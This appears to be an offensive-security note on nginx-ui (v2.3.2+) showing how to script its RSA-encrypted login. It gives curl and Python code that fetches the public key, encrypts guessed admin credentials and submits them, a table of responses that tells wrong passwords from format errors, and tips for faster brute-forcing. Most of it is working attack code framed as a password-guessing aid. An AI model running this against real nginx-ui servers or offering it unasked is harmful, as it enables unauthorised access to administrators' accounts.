# nginx-ui Login Encryption Workflow (v2.3.2+)

## Overview
nginx-ui encrypts login credentials using RSA before sending them to the server. This prevents plaintext password interception but can be replicated by anyone who can reach the `/api/crypto/public_key` endpoint.

## Step-by-Step

### 1. Get the RSA Public Key
```bash
curl -s -X POST "http://target:9000/api/crypto/public_key" \
  -H "Content-Type: application/json" \
  -d '{"timestamp": 1234567890, "fingerprint": "test"}'
```

Response:
```json
{
  "public_key": "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEA...\n-----END RSA PUBLIC KEY-----\n",
  "request_id": "ea13a939-3f66-4b99-8073-8d81accd3960"
}
```

### 2. Encrypt Credentials with Python
```python
import requests
import json
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

# Get public key
resp = requests.post("http://target:9000/api/crypto/public_key",
                     json={"timestamp": 1234567890, "fingerprint": "test"})
public_key_pem = resp.json()["public_key"]
public_key = RSA.import_key(public_key_pem)

# Create cipher
cipher = PKCS1_v1_5.new(public_key)

# IMPORTANT: Use "name" field, NOT "username"
credentials = json.dumps({"name": "admin", "password": "password_to_try"})

# Encrypt and base64 encode
encrypted = cipher.encrypt(credentials.encode())
encrypted_b64 = base64.b64encode(encrypted).decode()

# Send login request
login_resp = requests.post("http://target:9000/api/login",
                          json={"encrypted_params": encrypted_b64})
print(login_resp.status_code, login_resp.text)
```

### 3. Response Codes

| Status | Message | Meaning |
|--------|---------|---------|
| 406 | `{"scope":"validate","code":406,"message":"Requested with wrong parameters","errors":{"name":"required"}}` | Used wrong field name (e.g., `username` instead of `name`) |
| 400 | `{"scope":"middleware","code":40001,"message":"decryption failed"}` | Encryption format incorrect |
| 500 | `{"scope":"user","code":40301,"message":"password incorrect"}` | Correct encryption, wrong password |
| 200 | `{"token":"...","short_token":"...",...}` | Successful login |

## Brute Force Considerations
- Each login requires a new RSA encryption (public key may change per request)
- Server may implement rate limiting after failed attempts
- Response codes help distinguish between format errors and wrong passwords
- Use session reuse to avoid TCP handshake overhead during brute force

## Common Mistakes
1. **Using `username` instead of `name`** — returns 406 with "name required" error
2. **Not base64-encoding the encrypted data** — returns "decryption failed"
3. **Using wrong padding scheme** — must use PKCS1_v1_5, not OAEP
4. **JSON formatting** — must be valid JSON string before encryption
